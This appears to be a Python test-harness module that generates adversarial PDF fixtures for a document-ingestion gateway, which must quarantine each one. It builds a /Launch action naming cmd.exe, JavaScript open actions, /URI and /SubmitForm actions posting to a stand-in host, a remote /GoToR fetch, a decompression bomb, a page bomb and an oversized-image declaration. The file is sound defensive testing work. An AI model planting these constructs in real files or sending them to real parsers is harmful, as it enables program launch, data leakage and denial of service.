"""`F-ADV-PDF` — one PDF per malicious or malformed construct test plan §4.4 names.

    | **F-ADV-PDF** — malicious and malformed PDFs | One per construct: embedded JavaScript,
    | `OpenAction`, `AA`, `Launch`, embedded file, `URI`, `GoToR`, `SubmitForm`; plus a
    | decompression bomb, a 100k-page file, a 60000x60000-pixel image, an encrypted file, a
    | zero-page file, and a truncated file | Synthetic, generated by a committed build script
    | so they can be regenerated | `SEC-05..09`, `FUZZ-01/02`, `TC-INGEST-33..37` |

Fourteen constructs, and the corpus is the *input* to `FR-INGEST-33`/`-34`: every one of these
must quarantine at V0 and reach **no model call** (`FR-CONFORM-09`, `NFR-INGEST-08`, R74). None
of them carries an exploit payload — each is a structural declaration a PDF parser has to
decide about, which is precisely the decision the ingestion gateway is required to get right.

Not committed as binaries
-------------------------
§4.7: *"`F-ADV-PDF` is generated, not committed as binaries."* So `fixtures/F-ADV-PDF/` holds a
**manifest only** — one entry per construct, with the sha256 of the bytes this module emits and
the shape it declares. `tests.support.corpora.materialize_adv_pdfs()` writes the real files into
a temp directory on demand and verifies each against its declared digest.

That shape satisfies §4.8's entry criterion (*"generated and reproducible from committed
scripts"*) without putting fourteen files that every security scanner flags into a repository
teachers will clone. It also keeps `python -m harness.corpora.build --check` honest: the digests
are recomputed from the generators, so a generator edited without rebuilding fails the check.

**§4.4 and `FUZZ-01` disagree about this**, and the disagreement is real rather than a reading:
`FUZZ-01` says *"corpus committed to the repo"* and *"a failing seed is committed to the corpus
permanently"*. A committed manifest of committed *seeds and constructs* satisfies both — the
corpus is in the repo, the binaries are not — but the plan should say which it means. Reported
for `/create-test-plan` rather than resolved here.

Sizes
-----
The two resource-exhaustion constructs are sized by the constants below rather than by an
environment knob, because the declared digests must not depend on the machine that built them.
`PAGE_BOMB_PAGES` is §4.4's own number. `BOMB_DECOMPRESSED_BYTES` is this module's choice —
§4.4 names *"a decompression bomb"* and no size — and it is stated in the manifest, because what
a guard keys on is the **ratio**, not the absolute size, and a fixture that hides its ratio
cannot be argued with.
"""

from __future__ import annotations

import hashlib
import struct
import zlib
from dataclasses import dataclass, field
from typing import Any, Callable, Mapping

from harness.corpora.pdf_writer import (
    PdfObject,
    build_pdf,
    simple_page_document,
    stream_object,
)

#: §4.4 names this one: *"a 100k-page file"*.
PAGE_BOMB_PAGES = 100_000

#: §4.4 names *"a decompression bomb"* and no size. 64 MiB of zeros compresses to roughly 64 KiB,
#: a ratio near 1000:1 — decisive for any ratio-based guard, and cheap enough that regenerating
#: the corpus inside the fast tier's 90-second budget costs under a tenth of a second.
BOMB_DECOMPRESSED_BYTES = 64 * 1024 * 1024

#: §4.4 names this one: *"a 60000x60000-pixel image"*. Declared in the image dictionary against a
#: stream of a few hundred bytes — a renderer that trusts the declaration allocates about 10 TB.
GIANT_IMAGE_EDGE = 60_000


# --- the standard security handler, for the one construct that must really be encrypted -------
#
# A fixture that *declared* `/Encrypt` over unencrypted streams would be a different construct:
# a lenient parser reads it straight through and reports success, so the case would pass against
# an implementation that never handles encryption at all. So this is a real RC4-40 (V1 R2)
# encryption under an empty user password, which is what a teacher's scanner most often produces.

_PAD = bytes(
    (
        0x28, 0xBF, 0x4E, 0x5E, 0x4E, 0x75, 0x8A, 0x41,
        0x64, 0x00, 0x4E, 0x56, 0xFF, 0xFA, 0x01, 0x08,
        0x2E, 0x2E, 0x00, 0xB6, 0xD0, 0x68, 0x3E, 0x80,
        0x2F, 0x0C, 0xA9, 0xFE, 0x64, 0x53, 0x69, 0x7A,
    )
)

#: Fixed rather than random: the file `/ID` feeds the encryption key, and a random one would give
#: the fixture a different digest on every run — the exact non-reproducibility this module exists
#: to avoid.
_FILE_ID = bytes.fromhex("0123456789abcdef0123456789abcdef")

#: All permissions granted. The construct under test is that the file is *encrypted*, not that it
#: is restricted; a restrictive `/P` would add a second variable to a single-construct fixture.
_PERMISSIONS = -1


def _rc4(key: bytes, data: bytes) -> bytes:
    box = list(range(256))
    j = 0
    for i in range(256):
        j = (j + box[i] + key[i % len(key)]) % 256
        box[i], box[j] = box[j], box[i]
    out = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        out.append(byte ^ box[(box[i] + box[j]) % 256])
    return bytes(out)


def _owner_entry() -> bytes:
    """Algorithm 3 with both passwords empty: RC4 the padded user password under MD5(pad)."""
    key = hashlib.md5(_PAD).digest()[:5]  # noqa: S324 - the spec names MD5; not a security choice
    return _rc4(key, _PAD)


def _encryption_key(owner: bytes) -> bytes:
    """Algorithm 2, R2: the first 5 bytes of MD5(pad + O + P + ID)."""
    digest = hashlib.md5(  # noqa: S324 - see above
        _PAD + owner + struct.pack("<i", _PERMISSIONS) + _FILE_ID
    ).digest()
    return digest[:5]


def _object_key(key: bytes, number: int, generation: int = 0) -> bytes:
    """Algorithm 1: the per-object key, which is why every stream encrypts differently."""
    extended = key + number.to_bytes(3, "little") + generation.to_bytes(2, "little")
    return hashlib.md5(extended).digest()[: min(len(key) + 5, 16)]  # noqa: S324 - see above


# --- the fourteen constructs -------------------------------------------------------------------


def _javascript() -> bytes:
    """`/JavaScript` in the document Names tree — code that runs on open in a viewer."""
    action = PdfObject(
        6, b"<< /Type /Action /S /JavaScript /JS (app.alert\\(1\\);) >>"
    )
    names = PdfObject(7, b"<< /JavaScript << /Names [(fixture) 6 0 R] >> >>")
    return simple_page_document(
        extra_catalog=b" /Names 7 0 R", extra_objects=(action, names)
    )


def _open_action() -> bytes:
    """`/OpenAction` — an action the viewer performs before the document is displayed."""
    action = PdfObject(6, b"<< /Type /Action /S /JavaScript /JS (this.print\\(\\);) >>")
    return simple_page_document(extra_catalog=b" /OpenAction 6 0 R", extra_objects=(action,))


def _additional_actions() -> bytes:
    """`/AA` — page-level additional actions, which fire on open and close rather than on click."""
    action = PdfObject(6, b"<< /Type /Action /S /JavaScript /JS (app.alert\\(2\\);) >>")
    return simple_page_document(
        extra_page=b" /AA << /O 6 0 R /C 6 0 R >>", extra_objects=(action,)
    )


def _launch() -> bytes:
    """`/Launch` — an action asking the viewer to start an external program."""
    action = PdfObject(
        6, b"<< /Type /Action /S /Launch /F (cmd.exe) /Win << /F (cmd.exe) >> >>"
    )
    return simple_page_document(extra_catalog=b" /OpenAction 6 0 R", extra_objects=(action,))


def _embedded_file() -> bytes:
    """An `/EmbeddedFile` attachment — a second file smuggled inside the submission."""
    payload = b"attached-payload\n"
    stream = stream_object(6, b"<< /Type /EmbeddedFile /Subtype /text#2Fplain >>", payload)
    spec = PdfObject(
        7,
        b"<< /Type /Filespec /F (payload.txt) /UF (payload.txt)"
        b" /EF << /F 6 0 R >> >>",
    )
    names = PdfObject(8, b"<< /EmbeddedFiles << /Names [(payload.txt) 7 0 R] >> >>")
    return simple_page_document(
        extra_catalog=b" /Names 8 0 R", extra_objects=(stream, spec, names)
    )


def _uri() -> bytes:
    """A `/URI` link annotation — an outbound request the moment a reader follows it."""
    action = PdfObject(6, b"<< /Type /Action /S /URI /URI (http://example.invalid/beacon) >>")
    annot = PdfObject(
        7,
        b"<< /Type /Annot /Subtype /Link /Rect [72 700 300 730] /Border [0 0 0]"
        b" /A 6 0 R >>",
    )
    return simple_page_document(
        extra_page=b" /Annots [7 0 R]", extra_objects=(action, annot)
    )


def _goto_remote() -> bytes:
    """`/GoToR` — a jump into a *remote* document, which is a fetch dressed as navigation."""
    action = PdfObject(
        6,
        b"<< /Type /Action /S /GoToR /F (\\\\\\\\host.invalid\\\\share\\\\next.pdf)"
        b" /D [0 /Fit] >>",
    )
    return simple_page_document(extra_catalog=b" /OpenAction 6 0 R", extra_objects=(action,))


def _submit_form() -> bytes:
    """`/SubmitForm` — the construct that sends the document's field values somewhere."""
    action = PdfObject(
        6,
        b"<< /Type /Action /S /SubmitForm /F << /FS /URL /F (http://example.invalid/collect) >>"
        b" /Flags 4 >>",
    )
    annot = PdfObject(
        7,
        b"<< /Type /Annot /Subtype /Widget /FT /Btn /T (submit) /Rect [72 660 200 690]"
        b" /A 6 0 R >>",
    )
    return simple_page_document(
        extra_catalog=b" /AcroForm << /Fields [7 0 R] >>",
        extra_page=b" /Annots [7 0 R]",
        extra_objects=(action, annot),
    )


def _decompression_bomb() -> bytes:
    """A FlateDecode stream that expands by roughly three orders of magnitude.

    Written as a content stream on a real page, so a parser that walks the page tree reaches it
    the way it would reach any other content — a bomb hidden in an unreferenced object would
    only catch implementations that decompress everything, which is not the failure R74 names.
    """
    compressor = zlib.compressobj(9)
    payload = compressor.compress(b"\x00" * BOMB_DECOMPRESSED_BYTES) + compressor.flush()
    bomb = stream_object(6, b"<< /Filter /FlateDecode >>", payload)
    return build_pdf(
        [
            PdfObject(1, b"<< /Type /Catalog /Pages 2 0 R >>"),
            PdfObject(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"),
            PdfObject(
                3,
                b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 6 0 R >>",
            ),
            bomb,
        ]
    )


def _page_bomb() -> bytes:
    """`PAGE_BOMB_PAGES` pages, each a legal page object.

    Every page is identical apart from its object number, which is the point: the file is
    entirely well-formed and the only thing wrong with it is how much of it there is.
    """
    first = 3
    kids = b" ".join(
        b"%d 0 R" % (first + index) for index in range(PAGE_BOMB_PAGES)
    )
    pages = [
        PdfObject(
            first + index,
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>",
        )
        for index in range(PAGE_BOMB_PAGES)
    ]
    return build_pdf(
        [
            PdfObject(1, b"<< /Type /Catalog /Pages 2 0 R >>"),
            PdfObject(
                2,
                b"<< /Type /Pages /Kids [" + kids + b"] /Count "
                + str(PAGE_BOMB_PAGES).encode("ascii") + b" >>",
            ),
            *pages,
        ]
    )


def _giant_image() -> bytes:
    """An image XObject declaring `GIANT_IMAGE_EDGE` on a side over a few hundred bytes of data.

    The declaration is the attack. A consumer that allocates from `/Width * /Height * 3` asks
    for about 10 TB before it has read a single sample, which is `NFR-INGEST-08`'s bounded-memory
    requirement stated from the other side.
    """
    edge = str(GIANT_IMAGE_EDGE).encode("ascii")
    data = zlib.compress(b"\xff" * 768, 9)
    image = stream_object(
        6,
        b"<< /Type /XObject /Subtype /Image /Width " + edge + b" /Height " + edge
        + b" /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /FlateDecode >>",
        data,
    )
    content = stream_object(4, b"<< >>", b"q 612 0 0 792 0 0 cm /Im0 Do Q\n")
    return build_pdf(
        [
            PdfObject(1, b"<< /Type /Catalog /Pages 2 0 R >>"),
            PdfObject(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"),
            PdfObject(
                3,
                b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R"
                b" /Resources << /XObject << /Im0 6 0 R >> >> >>",
            ),
            content,
            image,
        ]
    )


def _encrypted() -> bytes:
    """A genuinely RC4-40-encrypted document under an empty user password.

    Really encrypted, not merely declaring `/Encrypt`: a file that declared encryption over
    plaintext streams would be read straight through by a lenient parser, and this fixture would
    then pass against an implementation that handles no encryption at all — measuring the
    opposite of what it claims.
    """
    owner = _owner_entry()
    key = _encryption_key(owner)
    user = _rc4(key, _PAD)

    content = b"BT /F1 12 Tf 72 720 Td (Question 1) Tj ET\n"
    encrypted_content = _rc4(_object_key(key, 4), content)

    def _pdf_string(raw: bytes) -> bytes:
        return b"<" + raw.hex().encode("ascii") + b">"

    encrypt = PdfObject(
        6,
        b"<< /Filter /Standard /V 1 /R 2 /O " + _pdf_string(owner)
        + b" /U " + _pdf_string(user)
        + b" /P " + str(_PERMISSIONS).encode("ascii") + b" >>",
    )
    trailer = (
        b"/Encrypt 6 0 R /ID [" + _pdf_string(_FILE_ID) + b" " + _pdf_string(_FILE_ID) + b"]"
    )
    return build_pdf(
        [
            PdfObject(1, b"<< /Type /Catalog /Pages 2 0 R >>"),
            PdfObject(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"),
            PdfObject(
                3,
                b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R"
                b" /Resources << /Font << /F1 5 0 R >> >> >>",
            ),
            stream_object(4, b"<< >>", encrypted_content),
            PdfObject(5, b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"),
            encrypt,
        ],
        trailer_extra=trailer,
    )


def _zero_page() -> bytes:
    """A structurally valid PDF with `/Count 0` and no kids — a submission with nothing in it.

    The failure this guards is `IngestReport` reporting success over an empty result, which
    `CT-INGEST-08` calls the top silent-failure trap. Quarantine is the right outcome; "ingested
    0 pages, status success" is the wrong one, and only a zero-page fixture can tell them apart.
    """
    return build_pdf(
        [
            PdfObject(1, b"<< /Type /Catalog /Pages 2 0 R >>"),
            PdfObject(2, b"<< /Type /Pages /Kids [] /Count 0 >>"),
        ]
    )


def _truncated() -> bytes:
    """A valid document cut mid-object, so the xref offsets point past the end of the file.

    Cut at a fraction rather than at a byte count, so the fixture stays correct if the writer's
    output length changes — a hard offset would silently become "cut after `%%EOF`", which is a
    complete file and tests nothing.
    """
    whole = simple_page_document(page_text="Question 1 truncated")
    return whole[: (len(whole) * 2) // 3]


@dataclass(frozen=True)
class PdfConstruct:
    """One fixture: what it carries, what must happen to it, and how to build it."""

    construct_id: str
    construct: str
    #: The `FR-CONFORM-09` threat kind this construct belongs to, where the requirement names
    #: one. `conform_vocabulary.MALICIOUS_PDF_KINDS` holds the four the requirement enumerates;
    #: the corpus is a superset of it, and `tests/support/adversarial.py` asserts the relation in
    #: that direction rather than assuming it.
    threat_kind: str
    #: `active_content` | `resource_exhaustion` | `malformed`. §4.4 lists the constructs in these
    #: three groups without naming them; the names are this module's and are declared in the
    #: manifest so a case can select a group without pattern-matching on an id.
    threat_class: str
    rationale: str
    builder: Callable[[], bytes]
    declared: Mapping[str, Any] = field(default_factory=dict)


#: `FR-CONFORM-09` requires every one of these to quarantine at the first validation gate and to
#: reach no model call. Declared once, on every entry, because a manifest whose expected outcome
#: varied per construct would invite an implementation to negotiate with the easy ones.
QUARANTINE_GATE = "V0"
EXPECTED_OUTCOME = "quarantine"
EXPECTED_MODEL_CALLS = 0

